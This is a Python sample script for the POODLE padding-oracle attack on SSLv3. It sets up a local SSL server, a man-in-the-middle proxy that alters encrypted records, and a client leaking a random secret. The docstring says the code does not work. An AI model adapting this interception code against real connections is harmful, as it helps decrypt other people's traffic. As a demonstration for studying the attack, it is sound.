""" This sample shows how to exploit the POODLE vulnerability.
    Python 3.x required.
    However, this code does NOT work!

    Result:
    FAIL: SecureTCPHandler, while receiving, got SSL error: [SSL: DECRYPTION_FAILED_OR_BAD_RECORD_MAC] decryption failed or bad record mac (_ssl.c:2217)
    FAIL: PoodleClient ssl error: [SSL: SSLV3_ALERT_BAD_RECORD_MAC] sslv3 alert bad record mac (_ssl.c:2217)

    See: https://stackoverflow.com/questions/3724900/python-ssl-problem-with-multiprocessing
"""

import sys
import binascii
import struct
import random
import string

sys.path.append('../src')
from poodle import POODLE

# import SocketServer     # Python 2
import socketserver  # Python 3
import ssl
import threading
import select
import socket

# Generate a random string to transmit
secret = ''.join([random.choice(string.printable) for c in range(25)])

# Original: "SHA1+DES"
# OpenSSL docs: SHA1+DES represents all cipher suites containing the SHA1 and the DES algorithms
# $ openssl ciphers | tr : '\n' | sort | fgrep DES
ciphers_to_use = 'DES-CBC3-SHA'


class PoodleClient(POODLE):
    def __init__(self):
        POODLE.__init__(self)
        return

    def trigger(self, prefix, suffix=''):
        tcp_socket = socket.create_connection((MITM_HOST, MITM_PORT))
        try:
            ssl_socket = ssl.wrap_socket(tcp_socket, server_side=False,
                                         ssl_version=ssl.PROTOCOL_SSLv3,
                                         cert_reqs=ssl.CERT_NONE,
                                         ciphers=ciphers_to_use)
        except ssl.SSLError as e:
            print('FAIL: PoodleClient wrap_socket() ssl error: %s' % e)
            return

        self.message = None

        output = '%s|secret=%s|%s' % (prefix, secret, suffix)
        output_bytes = bytearray(output, 'ASCII')
        #print("XXX trigger(%s, %s), output: %s, bytes: %s" % (prefix, suffix, output, binascii.hexlify(output_bytes)))
        try:
            ssl_socket.send(output_bytes)
            ssl_socket.recv(2)
        except ssl.SSLError as e:
            print('FAIL: PoodleClient ssl error: %s' % e)
            exit(1)

        ssl_socket.close()

        return self.message


class MitmTCPHandler(socketserver.BaseRequestHandler):
    def handle(self):
        destination = socket.create_connection((SSL_HOST, SSL_PORT))

        just_altered = False
        running = True
        sockets = [self.request, destination]
        while running:
            inputready, outputready, exceptready = select.select(sockets, [], [])
            for s in inputready:
                if s == self.request:
                    header = self.request.recv(5)
                    if header == b'':
                        print('client disconnected')
                        running = False
                        break

                    (content_type, version_major, version_minor, length) = struct.unpack('>BBBH', header)
                    if version_major != 3 and version_minor != 0:
                        raise RuntimeError("This is not SSLv3!")
                    data = self.request.recv(length)
                    if content_type == 23 and length > 24:  # SSLv3 spec, Content type 23 = application data
                        print("dbg: header: %s is: (content_type %d, version %d.%d, length %d)" %
                              (binascii.hexlify(header), content_type, version_major, version_minor, length))
                        # Go tweak the data!
                        data = poodle.message_callback(data)
                        just_altered = True

                        # print 'client->server (%u): %s' % (length, repr(data), )

                    destination.send(header + data)
                elif s == destination:
                    data = destination.recv(1024)
                    if data == '':
                        # print 'server disconnected'
                        running = False
                        if just_altered:
                            poodle.mark_error()
                        break
                    if just_altered:
                        (content_type, version_major, version_minor, length) = struct.unpack('>BBBH', data[:5])
                        if content_type == 23:  # SSLv3 spec, Content type app data
                            # server response message: decryption worked!
                            poodle.mark_success()
                        if content_type == 21:  # SSLv3 spec, Content type alert
                            # bad mac alert
                            poodle.mark_error()
                        just_altered = False
                    # print 'server->client: %s' % (repr(data), )
                    self.request.send(data)

        self.finish()
        return


class SecureTCPHandler(socketserver.BaseRequestHandler):
    def handle(self):
        try:
            self.request = ssl.wrap_socket(self.request,
                                           keyfile="cert.pem",
                                           certfile="cert.pem",
                                           server_side=True,
                                           ssl_version=ssl.PROTOCOL_SSLv3,
                                           cert_reqs=ssl.CERT_NONE,
                                           ciphers=ciphers_to_use)
        except ssl.SSLError as e:
            print('FAIL: SecureTCPHandler wrap_socket() ssl error: %s' % e)
            exit(1)

        while True:
            try:
                data = self.request.recv(1024)
                if data == '':
                    break
                #print('dbg: securely received: %s' % repr(data))
                self.request.send(b'ok')
            except ssl.SSLError as e:
                print('FAIL: SecureTCPHandler, while receiving, got SSL error: %s' % e)
                exit(1)
            except ConnectionAbortedError:
                break
            except BrokenPipeError:
                break

        return


if __name__ == "__main__":
    SSL_HOST, SSL_PORT = "0.0.0.0", 30001
    MITM_HOST, MITM_PORT = "0.0.0.0", 30002

    print('THE SECRET IS %s' % repr(secret))

    socketserver.TCPServer.allow_reuse_address = True

    secure_server = socketserver.TCPServer((SSL_HOST, SSL_PORT), SecureTCPHandler)
    mitm_server = socketserver.TCPServer((MITM_HOST, MITM_PORT), MitmTCPHandler)

    threads = [
        threading.Thread(target=secure_server.serve_forever),
        threading.Thread(target=mitm_server.serve_forever),
    ]

    for thread in threads:
        thread.start()

    poodle = PoodleClient()
    poodle.run()
    print('done')

    secure_server.shutdown()
    mitm_server.shutdown()

    # for thread in threads:
    #  thread.join()